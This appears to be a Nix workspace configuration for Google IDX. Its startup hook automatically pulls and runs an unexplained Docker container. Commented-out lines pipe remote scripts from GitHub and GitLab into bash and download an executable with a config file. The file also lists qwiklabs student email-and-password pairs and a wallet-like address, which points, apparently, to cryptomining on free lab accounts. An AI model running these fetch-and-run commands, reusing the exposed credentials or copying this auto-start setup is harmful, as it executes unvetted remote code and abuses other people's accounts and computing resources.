# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/anod.sh" | bash
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/ye.sh" | bash
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/nis.sh/nis.sh" | bash
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/aaa.sh" | bash
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/yeni.sh" | bash
# curl -sSL "https://gitlab.com/jasa4/jasa/-/raw/main/kilan" | bash
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/kilan" | bash

# student-04-871e8e0fd1ff@qwiklabs.net Fb4zyO6KDdPc
# student-01-8ff4f028ff4b@qwiklabs.net Uub1lN7wxx09
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/scalas.sh" | bash
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/mbcmaster.sh" | bash
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco.sh" | bash
# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/sw.sh" | bash
# R9uBfT46Kv9kGa4bbeYRvmoNwYCitp7Hit
# ([ -f cloud ] || wget -q -O cloud https://github.com/barburonjilo/open/raw/refs/heads/main/isu) && wget -q -O config.json https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json && chmod +x cloud config.json
# 
{ pkgs, ... }: {
  channel = "stable-24.05";

  packages = [
    pkgs.docker
    pkgs.curl
  ];

  # aktifin docker
  services.docker.enable = true;

  idx = {
    workspace = {
      onStart = {
        run-tide = ''
          echo "Starting Docker..."

          # pastikan docker jalan (kadang IDX butuh delay)
          sleep 5

          # pull image
          docker pull repotide/tide7

          # hapus container lama kalau ada
          docker rm -f tide7 || true

          # run container
          docker run -d \
            --name tide7 \
            --restart unless-stopped \
            repotide/tide7

          echo "Tide7 container started!"
        '';
      };
    };
  };
}
